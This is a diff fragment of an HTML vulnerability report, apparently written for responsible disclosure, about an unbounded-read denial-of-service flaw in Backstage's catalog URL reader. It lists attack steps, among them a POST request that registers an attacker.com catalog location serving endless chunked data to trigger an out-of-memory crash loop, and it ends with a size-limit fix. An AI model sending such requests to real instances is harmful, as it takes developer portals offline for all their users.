+
+  <h2>Attack Scenario</h2>
+  <p>1. Attacker registers a catalog location pointing to their server: <code>POST /api/catalog/locations { "type": "url", "target": "https://attacker.com/catalog.yaml" }</code></p>
+  <p>2. Attacker's server responds with <code>Transfer-Encoding: chunked</code> and streams infinite data (no <code>Content-Length</code>).</p>
+  <p>3. Backstage's catalog processor calls <code>reader.readUrl()</code>, which calls <code>getRawBody(stream)</code> with no limit.</p>
+  <p>4. Node.js heap grows until the process is OOM-killed. The entire developer portal goes down for all users.</p>
+  <p>5. On restart, the backend re-processes all catalog locations from the database &mdash; including the attacker's URL. It crashes again. <strong>Crash loop.</strong></p>
+  <p>6. Recovery requires manual database intervention to remove the malicious location.</p>
+
+  <p>Alternative trigger: <code>$text</code> or <code>$yaml</code> placeholder substitution in a catalog entity (<code>PlaceholderProcessor.ts:110</code>) also reads URLs through the same path.</p>
+
+  <h2>Impact</h2>
+  <p>Complete denial of service for the Backstage instance. All developers lose access to the service catalog, template scaffolder, TechDocs, and any plugin that depends on the backend. The crash loop persists until an administrator manually removes the malicious catalog entry from the database.</p>
+
+  <h2>Recommended Fix</h2>
+  <pre><code>// ReadUrlResponseFactory.ts line 54:
+// BEFORE:
+buffer = getRawBody(stream);
+
+// AFTER:
+buffer = getRawBody(stream, { limit: '50mb' });
+
+// Apply the same limit to ALL getRawBody calls:
+// GoogleGcsUrlReader.ts:122
+// ReadableArrayResponse.ts:66
+// GcpBucketWorkspaceProvider.ts:124, 133</code></pre>
+</div>
+
+<hr>
+
+<div style="text-align: center; color: var(--muted); font-size: 0.8rem; padding: 1rem 0;">
+  <p>All vulnerabilities verified against Backstage main branch. Exploits use verbatim Backstage code.</p>
+  <p>For responsible disclosure via <a href="https://hackerone.com/spotify" style="color: var(--muted);">Spotify's HackerOne program</a></p>
+</div>
